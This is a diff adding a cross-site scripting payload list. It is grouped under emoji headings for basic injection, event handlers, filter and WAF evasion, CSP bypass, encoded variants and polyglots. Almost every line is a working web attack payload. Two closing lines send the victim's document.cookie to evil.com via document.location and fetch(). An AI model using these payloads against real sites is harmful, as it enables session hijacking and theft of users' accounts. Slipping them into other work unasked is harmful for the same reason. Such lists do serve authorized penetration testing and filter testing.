@@ -1,0 +1,45 @@
+# 🔥 Basic script injection
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+<svg/onload=alert('XSS')>
+
+# 🕵️‍♂️ Event handler-based XSS
+"><body onload=alert(1)>
+"><input onfocus=alert(1) autofocus>
+"><button onmouseover=alert(1)>Hover Me</button>
+"><a href="javascript:alert(1)">Click me</a>
+"><video oncanplay=alert(1)><source src=invalid></video>
+"><iframe src="javascript:alert(1)"></iframe>
+
+# 🏴‍☠️ Advanced obfuscation (Bypassing weak filters)
+"><img src=x oNeRrOr="jaVaSCript:alert(1)">
+"><scr<script>ipt>alert(1)</scr<script>ipt>
+"><svg><script>alert('XSS')</script></svg>
+"><svg/onload=eval(atob('YWxlcnQoMSk='))>  # Base64 obfuscation
+<marquee loop=1 width=0 onfinish=alert(1)>
+
+# 🛠️ Bypassing CSP (Content Security Policy)
+<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
+<iframe srcdoc="<script>alert('XSS')</script>"></iframe>
+
+# 📌 JavaScript URIs
+javascript:alert(document.cookie)
+data:text/html,<script>alert(1)</script>
+
+# 🎭 Unicode & Encoded Variants (Bypassing WAF)
+%3Cscript%3Ealert(1)%3C/script%3E  # URL Encoded
+\x3Cscript\x3Ealert(1)\x3C/script\x3E  # Hex Encoding
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;  # HTML Entity Encoding
+
+# 🏆 Polyglot Payloads (Bypassing multiple filters)
+"><script>alert(1)</script><img src=x onerror=alert(1)>
+"><scr<script>ipt>alert(1)</scr<script>ipt><svg/onload=alert(1)>
+"><img src=x oNeRrOr=javaSCRIPT:/*--*/alert(1)>
+
+# 🛑 DOM-Based XSS Examples
+javascript:document.write('<script>alert(1)</script>')
+<svg><script>document.location='http://evil.com/'+document.cookie</script></svg>
+"><img src=x onerror="fetch('http://evil.com?c='+document.cookie)">
